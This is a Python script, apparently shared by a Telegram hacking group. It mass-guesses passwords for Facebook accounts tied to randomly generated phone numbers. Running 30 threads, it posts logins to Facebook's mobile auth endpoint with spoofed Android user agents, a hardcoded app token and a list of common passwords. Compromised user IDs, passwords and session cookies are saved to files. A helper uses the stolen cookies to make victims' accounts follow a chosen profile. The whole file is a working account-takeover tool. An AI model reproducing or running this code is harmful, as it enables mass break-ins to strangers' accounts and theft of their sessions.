#====== SC SEND : KALYAN KING

#======= TELIGERM : KGF CYBER TEM 
try:
	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
	os.system('pip install requests pip install bs4 > /dev/null')
	exit('\n Enter ')
logo ='''
,____________________________≎__________/\       \033[1;91m
|_________________,----------._ [____]  ""-,__  __....-----=====\033[1;96m
               (_(≛≛≛≛≛≛≛≛≛≛≛≛)___________/   ""                |\033[1;92m
                  `----------' RAWcHi[ ))"-,                   |\033[1;95m
                                       ""    `,  _,--....___  __|\033[1;93m
                                               `/                          \033[1;97m'''
loop = 0
oks = []
pcp=[]
cps=[]

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://m.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
    
    
#---------------------POLICE-MENU---------------------#
def menu():
	os.system('clear')
	os.system("xdg-open https://t.me/KGF_TEAM_CYBER")
	os.system("xdg-open https://t.me/KGF_TEAM_CYBER")
	print(logo)
	print('\033[0;92m[ 1 ] CRACK RANDOM-Vip \033[0;92m')
	print(f"\x1b[1;92m╍╌╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍╌╍‒\x1b[1;94m╍‒╍╌╍╌╍\x1b[1;97m‒╍╌╍╌╍╍\x1b[1;96m‒╍╌╍╌╍‒╍\x1b[1;93m‒╍╌╍╌╍‒╍\x1b[1;91m╍╌╍╌╍╌╍‒\x1b[1;92m╍╌╍╌╍╌╍")
	opt = input('[◕⁠]\033[0;97m Choose : \033[0;92m')
	if opt =='1':
		afg_randome()
	elif opt =='0':
		menu()
	else:
		print('\033[1;97m [◕⁠] Choose :\033[0;92m')
#---------------------POLICE-RANDOM_CRACK---------------------#
def afg_randome():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] Cod Kurdstan [770 771 772 773]≈[750 751 752]=[780 781 782]....')
	print(47*'-')
	kode = input('[?] Halbzhera : ')
	print(47*'-')
	limit = int('99999')
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as ahd:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[1;97mTOTAL  NUMBERS➔: \033[1;92m'+tl)
		print(f"\x1b[1;92m╍╌╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍╌╍‒\x1b[1;94m╍‒╍╌╍╌╍\x1b[1;97m‒╍╌╍╌╍╍\x1b[1;96m‒╍╌╍╌╍‒╍\x1b[1;93m‒╍╌╍╌╍‒╍\x1b[1;91m╍╌╍╌╍╌╍‒\x1b[1;92m╍╌╍╌╍╌╍")
		for guru in user:
			ids = kode+guru
			mking_pass = [ids,guru,'hamahama','hama1234','19901990','zaxozaxo','zaxo1234','11223344','kurdkurd','kurd1234','12344321','07500750','07700770','07800780','19801980','ahmad1234','12341234','hama12345',]
			ahd.submit(rndm,ids,mking_pass)
	print(45*'\n\033[1;32m╌')
	print('[●]➔/sdcard/RAWCHI➟OK.txt')
	print('[●]➔/sdcard/RAWCHI‌➟CP.txt')
	print(f"\x1b[1;92m╍╌╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍╌╍‒\x1b[1;94m╍‒╍╌╍╌╍\x1b[1;97m‒╍╌╍╌╍╍\x1b[1;96m‒╍╌╍╌╍‒╍\x1b[1;93m‒╍╌╍╌╍‒╍\x1b[1;91m╍╌╍╌╍╌╍‒\x1b[1;92m╍╌╍╌╍╌╍")
	print('Back Menu ??')
#---------------------RAWCHI-CRACK---------------------#
def rndm(ids,mking_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [RawChi⚽] %s|\033[1;32mǾĶ:-%s   CP:-[0] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in mking_pass:
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
			model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
			build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
			fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
			ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'
			data ={"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
			head = {'user-agent':ua,'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
			if 'session_key' in po:
				uid = po['uid']
				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
				print('\r\r\033[1;32m [🔐OK️] '+str(uid)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m[COOKIE]≈[🍪] %s   '%(coki))
				open('/sdcard/RAWCHI✅OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = po['error']['error_data']['uid']
				print('\r\r\x1b[1;33m [🔏CP] '+str(uid)+' | '+pas+'\033[1;97m')
				open('/sdcard/RAWCHI☢️CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			else:continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
menu()
